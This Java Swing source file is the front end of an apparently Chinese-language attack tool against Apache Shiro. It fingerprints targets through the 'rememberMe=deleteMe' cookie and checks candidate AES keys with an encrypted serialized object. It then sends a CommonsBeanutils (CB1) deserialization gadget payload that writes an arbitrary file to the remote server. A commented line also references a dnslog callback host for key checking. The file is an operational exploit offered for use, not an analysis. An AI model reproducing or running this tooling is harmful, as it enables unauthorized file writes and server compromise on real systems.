

import Util.AESUtils;
import Util.GadGets;
import Util.HTTPUtils;
import Util.SerializableUtils;
import com.formdev.flatlaf.*;
import org.apache.commons.codec.binary.Base64;
import org.apache.shiro.subject.SimplePrincipalCollection;

import javax.swing.*;
import javax.swing.plaf.FontUIResource;
import java.awt.*;
import java.awt.event.*;
import java.net.HttpURLConnection;
import java.util.Enumeration;
import java.util.Map;


public class UI {
    private JButton CheckURLBTN;
    private JTextField URLAddress;
    private JComboBox HTTPMethod;
    private JTextField AESKey;
    private JComboBox gadgets;
    private JButton blastGadgetBTN;
    private JTextField FilePath;
    private JButton WriteFileBTN;
    private JTextArea FileContext;
    private JComboBox AESType;
    private JPanel mainJPanel;
    private JComboBox ProxyBTN;
    private JButton checkKeyBTN;
    private JButton checkGadgetsBTN;
    Boolean isShiro = false;
    int cookieRememberMeCount = 0;
    String cookieRememberMeKey = "";
    Object Gadgets = null; // 爆破利用链 或选择利用链之后绑定利用链代码

    public UI() {
        /**
         * 工具入口 唯一入口点
         */
        CheckURLBTN.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                // 验证URL格式
                if (URLAddress.getText().equals("URL") || URLAddress.getText().equals("") || URLAddress.getText() == null) {
                    JOptionPane.showMessageDialog(null, "请填写URL", "提示", JOptionPane.WARNING_MESSAGE);
                } else if (!URLAddress.getText().startsWith("http")) {
                    JOptionPane.showMessageDialog(null, "请正确填写URL", "提示", JOptionPane.WARNING_MESSAGE);
                } else {
                    HttpURLConnection conn = null;
                    // 读取HTTP方法
                    if (HTTPMethod.getSelectedItem().equals("GET")) {
                        if (URLAddress.getText().startsWith("http://")) {
                            conn = HTTPUtils.HTTPSend(URLAddress.getText(), HTTPMethod.getSelectedItem().toString(), ProxyBTN.getSelectedItem().equals("Proxy ON"), "");
                            checkIsShiro(conn);
                        } else if (URLAddress.getText().startsWith("https://")) {
                            HTTPUtils.HTTPSSend(URLAddress.getText(), HTTPMethod.getSelectedItem().toString(), ProxyBTN.getSelectedItem().equals("Proxy ON"), "");
                            checkIsShiro(conn);
                        }
                    } else if (HTTPMethod.getSelectedItem().equals("POST")) {
                        if (URLAddress.getText().startsWith("http://")) {
                            conn = HTTPUtils.HTTPSend(URLAddress.getText(), HTTPMethod.getSelectedItem().toString(), ProxyBTN.getSelectedItem().equals("Proxy ON"), "");
                            checkIsShiro(conn);
                        } else if (URLAddress.getText().startsWith("https://")) {
                            HTTPUtils.HTTPSSend(URLAddress.getText(), HTTPMethod.getSelectedItem().toString(), ProxyBTN.getSelectedItem().equals("Proxy ON"), "");
                            checkIsShiro(conn);
                        }
                    }


                }
            }
        });
        checkKeyBTN.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (!isShiro) {
                    JOptionPane.showMessageDialog(null, "请检查是否为Shiro框架", "提示", JOptionPane.WARNING_MESSAGE);
                } else {
                    if (AESKey.getText().equals("Key") || AESKey.getText().equals("") || AESKey.getText() == null) {
                        JOptionPane.showMessageDialog(null, "请填写Key", "提示", JOptionPane.WARNING_MESSAGE);
                    } else {
                        // 漏洞探测类 空类即可
                        SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();

                        HttpURLConnection CheckKeyConn = null;
                        try {
                            // Shiro 秘钥正确会返回单个delete, Shiro秘钥不正确会返回两个delete
                            // 检查Shiro秘钥是否正确的三种思路,urldns,命令执行(ping|sleep),SimplePrincipalCollection(如果正确会返回一个delete)
                            // byte[] aesByte = AESUtils.CBCencrypt(SerializableUtils.serializ(SerializableUtils.URLDNS("http://aaa.abc.fg1gu7ys.dnslog.pw")), AESKey.getText());

                            byte[] aesByte = AESUtils.AESEncodeType(SerializableUtils.serializ(simplePrincipalCollection), AESKey.getText(), AESType.getSelectedItem().toString());
                            // byte[] aesByte = AESUtils.CBCencrypt(SerializableUtils.serializ(simplePrincipalCollection), AESKey.getText());
                            String rememberPayload = Base64.encodeBase64String(aesByte);
                            if (URLAddress.getText().startsWith("http://")) {
                                CheckKeyConn = HTTPUtils.HTTPSend(URLAddress.getText(), HTTPMethod.getSelectedItem().toString(), ProxyBTN.getSelectedItem().equals("Proxy ON"), rememberPayload);
                                checkShiroKey(CheckKeyConn, AESKey.getText());

                            } else if (URLAddress.getText().startsWith("https://")) {
                                CheckKeyConn = HTTPUtils.HTTPSSend(URLAddress.getText(), HTTPMethod.getSelectedItem().toString(), ProxyBTN.getSelectedItem().equals("Proxy ON"), rememberPayload);
                                checkShiroKey(CheckKeyConn, AESKey.getText());

                            }
                        } catch (Exception ex) {
                            ex.printStackTrace();
                        }

                    }
                }
            }
        });
        /**
         * 爆破链功能未实现 写死CB链 后续加功能
         */
        blastGadgetBTN.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (cookieRememberMeKey.equals("") || cookieRememberMeKey.equals("Key")) {
                    JOptionPane.showMessageDialog(null, "未确认秘钥可使用, 请重试秘钥", "提示", JOptionPane.WARNING_MESSAGE);
                } else {
                    Gadgets = "CB1";
                    JOptionPane.showMessageDialog(null, "爆破成功,利用链为" + Gadgets, "提示", JOptionPane.WARNING_MESSAGE);
//                    Gadgets = GadGets.blastGadgets();
                    // 此处写爆破代码
                }
            }
        });
        WriteFileBTN.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (Gadgets == null || Gadgets.equals("")) {
                    JOptionPane.showMessageDialog(null, "请确定利用链之后再进行写入, 请重试秘钥", "提示", JOptionPane.WARNING_MESSAGE);
                } else {
                    if (FilePath.getText().equals("") || FilePath.getText() == null || FilePath.getText().equals("文件地址")) {
                        JOptionPane.showMessageDialog(null, "请写入文件地址", "提示", JOptionPane.WARNING_MESSAGE);
                    } else if (FileContext.getText().equals("") || FileContext.getText() == null || FileContext.getText().equals("文件内容")) {
                        JOptionPane.showMessageDialog(null, "请写入文件内容", "提示", JOptionPane.WARNING_MESSAGE);
                    } else {
                        int confirmWriteBTN = JOptionPane.showConfirmDialog(null, "确定要写入吗 ?", "提示", JOptionPane.WARNING_MESSAGE);
//                        JOptionPane.showMessageDialog(null, confirmWriteBTN, "提示", JOptionPane.WARNING_MESSAGE);

                        if (confirmWriteBTN == 0) { // 0代表确定
                            if (Gadgets == "CB1") {
                                try {
                                    // 生成payload
                                    byte[] aesByte = null;
                                    aesByte = AESUtils.AESEncodeType(SerializableUtils.serializ(GadGets.CB1(FilePath.getText(), FileContext.getText())), AESKey.getText(), AESType.getSelectedItem().toString());
                                    String rememberPayload = Base64.encodeBase64String(aesByte);
                                    // send
                                    if (URLAddress.getText().startsWith("http://")) {
                                        HttpURLConnection wfconn = HTTPUtils.HTTPSend(URLAddress.getText(), HTTPMethod.getSelectedItem().toString(), ProxyBTN.getSelectedItem().equals("Proxy ON"), rememberPayload);

                                    } else if (URLAddress.getText().startsWith("https://")) {
                                        HttpURLConnection wfconn = HTTPUtils.HTTPSSend(URLAddress.getText(), HTTPMethod.getSelectedItem().toString(), ProxyBTN.getSelectedItem().equals("Proxy ON"), rememberPayload);
                                    }
                                    JOptionPane.showMessageDialog(null, "写入执行完毕 请检查服务器中是否有你的文件", "提示", JOptionPane.WARNING_MESSAGE);

                                } catch (Exception ex) {
                                    ex.printStackTrace();
                                    JOptionPane.showMessageDialog(null, "发生错误 请 v me 100 过来排错", "提示", JOptionPane.WARNING_MESSAGE);

                                }

                            } else if (Gadgets == "CC1") {

                            }
                        } else if (confirmWriteBTN == 2) {// 2代表取消

                        }
                    }
                }

            }
        });
    }


    private void checkShiroKey(HttpURLConnection conn, String ShiroKey) {
        Map<String, java.util.List<String>> respHeaders = conn.getHeaderFields();
        java.util.List<String> Cookie = respHeaders.get("Set-Cookie");
        if (this.cookieRememberMeCount > getStrCount(Cookie.toString(), "rememberMe=deleteMe")) {
            JOptionPane.showMessageDialog(null, "秘钥正确", "提示", JOptionPane.WARNING_MESSAGE);
            this.cookieRememberMeKey = ShiroKey;
        } else {
            JOptionPane.showMessageDialog(null, "秘钥不正确", "提示", JOptionPane.WARNING_MESSAGE);
        }
    }

    /**
     * 通过响应头 检查是否为Shiro框架
     *
     * @param conn
     */
    private void checkIsShiro(HttpURLConnection conn) {
        Map<String, java.util.List<String>> respHeaders = conn.getHeaderFields();
        java.util.List<String> Cookie = respHeaders.get("Set-Cookie");
        this.cookieRememberMeCount = getStrCount(Cookie.toString(), "rememberMe=deleteMe");
        if (Cookie.toString().contains("rememberMe=deleteMe")) {
            this.isShiro = true;
            JOptionPane.showMessageDialog(null, "确定为Shiro框架", "提示", JOptionPane.WARNING_MESSAGE);
        }
    }

    private static int getStrCount(String mainStr, String subStr) {
        int count = 0;
        int index = 0;
        int mainStrLength = mainStr.length();
        int subStrLength = subStr.length();
        if (subStrLength > mainStrLength) {
            return 0;
        }
        while ((index = mainStr.indexOf(subStr, index)) != -1) {
            count++;
            index += subStrLength;
        }
        return count;
    }

    public static void main(String[] args) {
        // 必须在窗体启动前设置
        // 设置使用Flat主题 亮色
//        FlatLightLaf.setup();
        // 设置使用Flat主题 暗色
//        FlatDarkLaf.setup();
        // 基于 FlatLaf Light）看起来像 IntelliJ IDEA 2019.2+ 中的 IntelliJ 主题
        FlatIntelliJLaf.setup();
        // （基于 FlatLaf Dark）看起来像来自 IntelliJ IDEA 2019.2+
//        FlatDarculaLaf.setup();

        UIManager.put("TextComponent.arc", 5);
        UIManager.put("Component.focusWidth", 1);
        UIManager.put("Component.innerFocusWidth", 1);
        UIManager.put("Button.innerFocusWidth", 1);
        UIManager.put("TitlePane.unifiedBackground", true);
        UIManager.put("TitlePane.menuBarEmbedded", false);


        // 设置字体抗锯齿
        System.setProperty("awt.useSystemAAFontSettings", "on");
        System.setProperty("swing.aatext", "true");
        Font fontUIResource = new Font("宋体", Font.PLAIN, 18);

        for (Enumeration keys = UIManager.getDefaults().keys(); keys.hasMoreElements(); ) {
            Object key = keys.nextElement();
            Object value = UIManager.get(key);
            if (value instanceof FontUIResource) {
                UIManager.put(key, fontUIResource);
            }
        }

        UIManager.put("defaultFont", fontUIResource);


        // 启动JFrame窗体 设置基本项
        JFrame frame = new JFrame("Shiro文件上传 由keleth强力驱动");
        frame.setContentPane(new UI().mainJPanel);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.pack();
        frame.setVisible(true);


        // 动态设置窗体格式
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        if (screenSize.getWidth() > 1280) {
            frame.setPreferredSize(new Dimension(900, 500));
        } else if (screenSize.getWidth() > 1024) {
            frame.setPreferredSize(new Dimension(700, 400));
        } else {
            frame.setPreferredSize(new Dimension(500, 300));
        }
        frame.pack();
        // 在屏幕中间启动
        frame.setLocationRelativeTo(null);
        // 设置关闭JFrame窗体时 后台进程一并关闭
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        // 使用Java的风格 会好看点l 没卵用
//        frame.setDefaultLookAndFeelDecorated(true);

    }

}
